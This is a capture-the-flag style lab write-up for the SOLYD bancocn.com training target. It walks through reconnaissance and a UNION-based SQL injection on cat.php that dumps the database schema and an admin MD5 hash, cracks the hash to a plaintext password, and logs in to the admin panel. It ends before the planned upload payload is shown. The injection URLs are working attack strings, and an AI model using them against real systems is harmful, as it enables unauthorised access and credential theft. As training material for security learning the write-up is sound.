# Write-up for the Lab from SOLYD bancocn.com 
## SQLI to extract admin credentials + RCE from from file upload and payload obfuscation  

### Scope  
Target: Web server located on bancocn.com (port 80)  
Black box  

### Reconnaissance  
The website is protected by cloudflare  
Nmap  shows barely nothing just 4 ports open: 80, 443, 8080, 8443; all http/https common web services.  
Whois shows barely nothing since they got that Whoisprivacy up and running. Expire Date 2027-03-29.  
Using Google dork I found http://www.bancocn.com/assets/ , http://www.bancocn.com/classes/ exposed.<!--Looks like its outta scope but I sent 'em a message anyways-->  

<!-- Shall we access the website ?! -->
Using a small list from dirb I found the following directories/files:  
403 .htaccess  
403 .htpasswd  
200 admin/     -Secret Login panel  
200 assets/    -Directory listing  
200 images/    -Directory listing  
200 robots.txt -Also exposes admin/  
200 index.php  -Let's explore it's functions  
<!-- Pages assets/ and images/ and classes/ looks to be filtered client side content but I'll take a look at it soon -->

**Found URL parameter ?id=1 while navigating through the site**  
http://www.bancocn.com/cat.php?id=1   
<!-- This attack vector looks like a good point for us to proceed to -->

### Exploitation  
Trying SQLI in exposed id parameter in url to check if it is well sanitized or not.  
{ http://www.bancocn.com/cat.php?id=1' } add simple quote to the end of it to see if it exposes any misconfig.  
It gave the following error message:  
"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1"  
Which exposes the service running: Mariadb  
{ http://www.bancocn.com/cat.php?id=1%20order%20by%204-- } shows that there are no column n°4 but { http://www.bancocn.com/cat.php?id=1%20order%20by%203-- }works which means there are 3 columns on the table where the content is stored.
{ http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,3-- } exposes that the column number 3 is exposed on screen. I'm gonna try to retrieve data from it.  
{ http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,group_concat(version(),0x3a,0x3a,database())-- } returns:  
**10.1.44-MariaDB-0ubuntu0.18.04.1::bancocn**  
{ http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()-- }  
**categories,pictures,stats,users**  
{ http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27-- }  
**id,login,password**  
{ http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,group_concat(login,0x3a,0x3a,password)%20from%20users-- }  
**admin::7b71be0e85318117d2e514ce2a2e222c**  
This looks like the login to that /admin page we found earlier  
We can try this hash in [hashes.com](https://hashes.com/en/tools/hash_identifier) to identify what exactly is this  
Looks like its md5  
Trying md5decrypt.net to break this hash it translated to senhafoda  
Tried admin : senhafoda on /admin panel and its good  
Now I'm looking into an image upload feature and I'll try to pass a payload there
